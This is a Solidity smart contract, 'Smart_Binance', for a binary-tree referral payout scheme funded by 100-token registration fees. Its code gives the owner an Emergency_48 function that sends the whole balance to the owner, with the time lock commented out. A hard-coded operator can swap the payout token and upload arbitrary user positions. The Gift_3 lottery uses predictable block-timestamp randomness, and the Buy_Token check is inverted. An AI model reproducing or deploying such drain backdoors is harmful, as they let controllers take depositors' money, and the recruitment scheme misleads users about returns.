// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.4.22 <0.9.0;
import "./Smart_Binary.sol";
contract Smart_Binance is Context {
    using SafeERC20 for IERC20; struct Node { 
        uint24 LD; uint24 RD; uint8 TCP; uint16 DP; uint8 CH; uint8 OR; address UPA; address LDA; address RDA; }
    mapping(address => Node) private _users;
    mapping(uint128 => address) private ALUSA;
    mapping(uint16 => address) private _DUP;
    address[] private CND;
    address[] private _PYL;
    address[] private _Ch_Add;
    uint32[] private _RNN;
    uint256 private LSR;
    uint256 private LSRSF;
    uint256 private VL_SF;
    uint128 private _USID;
    uint128 private Chck_AdID;
    uint64 private _CU_SF_CND;
    uint64 private _CU_PYL;
    uint16 private _DUPId;
    uint8 private Lk;
    uint8 private Count_Upload;
    uint8 CHG;
    address private owner;
    address private token;
    IERC20 private S_Coin;
    string private Note;
    string private IPFS;
    Smart_Binary private Nobj;
    constructor() {owner = _msgSender();
        LSR = block.timestamp;
        S_Coin = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        token = 0x4DB1B84d1aFcc9c6917B5d5cF30421a2f2Cab4cf;
        Nobj = Smart_Binary(0x3164B3841D2b603ddB43C909C7f6Efd787058541);        }
    function Reward_12() public {require(Lk == 0, "Proccesing");
            require( _users[_msgSender()].TCP > 0, "You dont have point" );
            // require( block.timestamp > LSR + 12 hours, "Reward_12 Time Has Not Come" );
            Lk = 1;
            uint256 V_Rwd = (PRP() * 90) - (Total_Point() * 10**18); VL_SF = (PRP() * 10);
            uint256 V_Pnt = ((V_Rwd)) / Total_Point();
            uint128 RwdCl = (Total_Point()) * 10**18;
        for(uint128 i = 0; i <= _USID; i = unsafe_inc(i)) { Node memory TMPNDE = _users[ALUSA[i]];
            uint24 Pnt; uint24 Result = TMPNDE.LD <= TMPNDE.RD ? TMPNDE.LD : TMPNDE.RD;
            if (Result > 0) { if (Result > 25) { Pnt = 25;
            if (TMPNDE.LD < Result) { TMPNDE.LD = 0; TMPNDE.RD -= Result; } 
            else if (TMPNDE.RD < Result) { TMPNDE.LD -= Result; TMPNDE.RD = 0; } 
            else {TMPNDE.LD -= Result; TMPNDE.RD -= Result; } } 
            else {Pnt = Result; 
            if (TMPNDE.LD < Pnt) { TMPNDE.LD = 0; TMPNDE.RD -= Pnt; } 
            else if (TMPNDE.RD < Pnt) { TMPNDE.LD -= Pnt; TMPNDE.RD = 0; } 
            else { TMPNDE.LD -= Pnt; TMPNDE.RD -= Pnt;}} TMPNDE.TCP = 0; _users[ALUSA[i]] = TMPNDE;
            if ( Pnt * V_Pnt > S_Coin.balanceOf(address(this))) { S_Coin.safeTransfer(ALUSA[i],S_Coin.balanceOf(address(this))); } 
            else { S_Coin.safeTransfer( ALUSA[i], Pnt * V_Pnt);}_PYL.push(ALUSA[i]);  _CU_PYL++;} } LSR = block.timestamp;
            if (RwdCl <= S_Coin.balanceOf(address(this))) { S_Coin.safeTransfer(_msgSender(), RwdCl);}
            Lk = 0; CHG = 1; LSRSF = block.timestamp;}
    function Register(address upline) public {
            require( _users[upline].CH != 2,"Upline has two directs!" );
            require( _msgSender() != upline, "You can not enter your address!");
            bool TsUs = false;
        for(uint128 i = 0; i <= _USID; i = unsafe_inc(i)) {
            if (ALUSA[i] == _msgSender()) { TsUs = true; break; } }
            require(TsUs == false, "You were registered!");
            bool TSUP = false;
        for(uint128 i = 0; i <= _USID; i = unsafe_inc(i)) {
            if (ALUSA[i] == upline) { TSUP = true; break;}}
            require(TSUP == true, "Upline is not exist!");
            S_Coin.safeTransferFrom( _msgSender(), address(this), 100 * 10**18 ); ALUSA[_USID] = _msgSender(); _USID++;
            uint16 DPCh = _users[upline].DP + 1; _users[_msgSender()] = Node(
            0, 0, 0, DPCh, 0, _users[upline].CH, upline, address(0), address(0) );
            if (_users[upline].CH == 0) { _users[upline].LD++; _users[upline].LDA = _msgSender(); } 
            else {_users[upline].RD++; _users[upline].RDA = _msgSender(); } _users[upline].CH++; setTDP(upline);
            address UPN = _users[upline].UPA;  address ChNde = upline;
        for( uint128 j = 0; j < _users[upline].DP; j = unsafe_inc(j)) 
            { if (_users[ChNde].OR == 0) { _users[UPN].LD++; } 
            else { _users[UPN].RD++; } setTDP(UPN); ChNde = UPN; UPN = _users[UPN].UPA; } }
    function Gift_3() public {           
            require(CHG == 1,"Gift_3 time has not come!" );
            require( block.timestamp > LSRSF + 1 hours, "Gift_3 time has not come" );
            require(VL_SF > 20*10**18, "Gift balance is not enough!" );
            require(_CU_SF_CND > 0, "There is no candidate!" );
            bool TsUsSF = false;
        for(uint128 i = 0; i < _CU_SF_CND; i = unsafe_inc(i)) {
            if (CND[i] == _msgSender()) { TsUsSF = true; break; } }
            require(TsUsSF == true, "You are not candidated!"); S_Coin.safeTransfer(_msgSender(),10 * 10**18 );
            uint256 NW = ((VL_SF - 10*10**18) / 10**18) / 10;
            if (NW != 0 && _CU_SF_CND != 0) {
            if (_CU_SF_CND > NW) {
        for(uint32 i = 1; i <= _CU_SF_CND; i++ ) {_RNN.push(i); }
        for(uint128 i = 1; i <= NW; i = unsafe_inc(i)) {
            uint256 randomIndex = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, i))) % _CU_SF_CND;
            uint128 RSN = _RNN[randomIndex]; _RNN[randomIndex] = _RNN[ _RNN.length - 1 ]; _RNN.pop();
            if(_users[CND[RSN - 1]].TCP == 0){ S_Coin.safeTransfer(CND[RSN - 1], 10 * 10**18 ); } }
        for( uint128 i = 0; i < (_CU_SF_CND - NW); i = unsafe_inc(i)) {_RNN.pop(); } } 
            else { for ( uint128 i = 0; i < _CU_SF_CND; i = unsafe_inc(i))
            { S_Coin.safeTransfer(CND[i], 10 * 10**18 );}}} delete CND; _CU_SF_CND = 0;
             VL_SF = 0; CHG = 0; delete _PYL; _CU_PYL=0;}
    function Smart_Gift() public { require(CHG == 1,"Smart_Gift time has not come!" );
            bool TsUsPY = false;
            for(uint128 i = 0; i < _CU_PYL; i = unsafe_inc(i)) {
                if (_PYL[i] == _msgSender()) { TsUsPY = true; break; } }
            require(TsUsPY == false, "You have point!");
            bool TsUs = false;
            for(uint128 i = 0; i <= _USID; i = unsafe_inc(i)) {
                if (ALUSA[i] == _msgSender()) { TsUs = true; break; } }
            require(TsUs == true, "You are not in smart binance contract!" );
            bool TsUsSF = false;
            for(uint128 i = 0; i < _CU_SF_CND; i = unsafe_inc(i)) {
                if (CND[i] == _msgSender()) { TsUsSF = true; break; } }
            require(TsUsSF == false, "You were candidated!");
            require(((((VL_SF - 10*10**18) / 10**18) / 10)*2) > (_CU_SF_CND), "Capacity is completed!");
            CND.push(_msgSender()); _CU_SF_CND++; }
    function Emergency_48() public {require(_msgSender() == owner, "You can not write!");
       // require(block.timestamp > LSR + 48 hours, "Emergency_48 Time Has Not Come" );
        S_Coin.safeTransfer(owner, S_Coin.balanceOf(address(this)) ); }
    function Buy_Token() public {
        require(IERC20(token).balanceOf(_msgSender()) >= (10 * 10**18), "You dont have enough S_Coin!" );
        S_Coin.safeTransferFrom(_msgSender(),address(this), 10 * 10**18 );
        IERC20(token).transfer(_msgSender(), 100 * 10**18); }
      function Get_Token() public { bool testUser = false;
        for (uint128 i = 0; i <= _USID; i = unsafe_inc(i)) {
        if (ALUSA[i] == _msgSender()) { testUser = true; break; } }
        require( testUser == true, "You are not in smart binance contract!" );
        bool testAllreadyUser = false;
        for (uint128 i = 0; i < Chck_AdID; i = unsafe_inc(i)) {
        if (_Ch_Add[i] == _msgSender()) { testAllreadyUser = true; break; } }
        require(testAllreadyUser == false,"You can not receive token again!");
        IERC20(token).transfer(_msgSender(), 100 * 10**18); _Ch_Add.push(_msgSender()); Chck_AdID++;}
    function Import (address UserAddress ) public {
        bool TsUs = false;
        for(uint128 i = 0; i <= _USID; i = unsafe_inc(i)) {
            if (ALUSA[i] == UserAddress) { TsUs = true; break; } }
            require(TsUs == false, "You were registered!");
            bool tsUsDUP = false;
        for(uint16 i = 0; i <= _DUPId; i++) {
        if (_DUP[i] == UserAddress) { tsUsDUP = true; break; } }
        require(tsUsDUP == false, "You were registered!");
        ALUSA[_USID] = UserAddress;  _users[ALUSA[_USID]] = Node( 
        uint24(Nobj.User_Information(UserAddress).leftDirect),
        uint24(Nobj.User_Information(UserAddress).rightDirect),
          0 , uint16(Nobj.User_Information(UserAddress).depth),
        uint8(Nobj.User_Information(UserAddress).childs),
        uint8(Nobj.User_Information(UserAddress).leftOrrightUpline),
        Nobj.User_Information(UserAddress).UplineAddress,
        Nobj.User_Information(UserAddress).leftDirectAddress,
        Nobj.User_Information(UserAddress).rightDirectAddress ); _USID++; }
    function Upload ( address user, uint24 L, uint24 R, uint16 DeP, uint8 CHs, uint8 LoR, address UAd, address LAd, address RAd ) 
        public { require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!");
        require(Count_Upload <= 150, "Its over!"); ALUSA[_USID] = user; _users[ALUSA[_USID]] 
        = Node( L, R, 0, DeP, CHs, LoR, UAd, LAd, RAd ); _USID++; Count_Upload++; }
       function _S_Coin(address add) public{
        require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); S_Coin = IERC20(add);}
    function PRP() private view returns (uint256) { return (S_Coin.balanceOf(address(this))) / 100; }
    function setTDP(address userAddress) private { 
        uint24 min = _users[userAddress].LD <= _users[userAddress].RD ? _users[userAddress].LD : _users[userAddress].RD;
    if (min > 0) { _users[userAddress].TCP = uint8(min); } }
    function unsafe_inc(uint128 x) private pure returns (uint128) { unchecked { return x + 1; } }
    function Add_DUP(address add) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); _DUP[_DUPId] = add; _DUPId++;}
    function Write_Note(string memory N) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); Note = N; }
    function Write_IPFS(string memory N) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); IPFS = N; }
    function User_Info(address UserAddress) public view returns (Node memory) {return _users[UserAddress]; }
    function Contract_Balance() public view returns (uint256) { return (S_Coin.balanceOf(address(this)) - VL_SF) / 10**18; }
    function Reward_12_Writer () public view returns (uint256) { return Total_Point(); }
    function Reward_Balance () public view returns (uint256) { 
        if(CHG == 1){ return (((S_Coin.balanceOf(address(this)) - VL_SF)/100)*90) / 10**18; }
        else{ return (PRP() * 90) / 10**18; } }
    function Gift_Balance() public view returns (uint256) {
        if(CHG == 1){ return VL_SF / 10**18; } else{ return (PRP() * 10) / 10**18; } }
    function Gift_Candidate() public view returns (uint256) { return _CU_SF_CND; }
    function Total_Register() public view returns (uint256) { return _USID; }
    function User_Upline(address Add_Address) public view returns (address) { return _users[Add_Address].UPA; }
    function User_Directs(address Add_Address) public view returns (address, address) { return (_users[Add_Address].LDA, _users[Add_Address].RDA ); }
    function User_Left_Right(address Add_Address) public view returns (uint256, uint256) { return ( _users[Add_Address].LD, _users[Add_Address].RD ); }
    function Total_Point () public view returns (uint128) { uint128 TPnt; for (uint128 i = 0; i <= _USID; i = unsafe_inc(i)) { uint32 min = _users[ALUSA[i]].LD <=
    _users[ALUSA[i]].RD ? _users[ALUSA[i]].LD : _users[ALUSA[i]].RD; if (min > 25) { min = 25; } TPnt += min; } return TPnt; }
    function Value_Point() public view returns (uint256) {
        if (Total_Point() == 0) {return Reward_Balance(); } else { return ((Reward_Balance ()) - (Total_Point())) / (Total_Point());} }
    function Read_Note() public view returns (string memory) { return Note; }
    function Read_IPFS() public view returns (string memory) { return IPFS; } 
    function User_Income(address Add_Address) public view returns (uint256){ return Value_Point() * _users[Add_Address].TCP;}
    function Gift_3_Writer() public view returns (uint256){
        if(VL_SF > 20*10**18){ return 10; } else{ return 0; } } }
    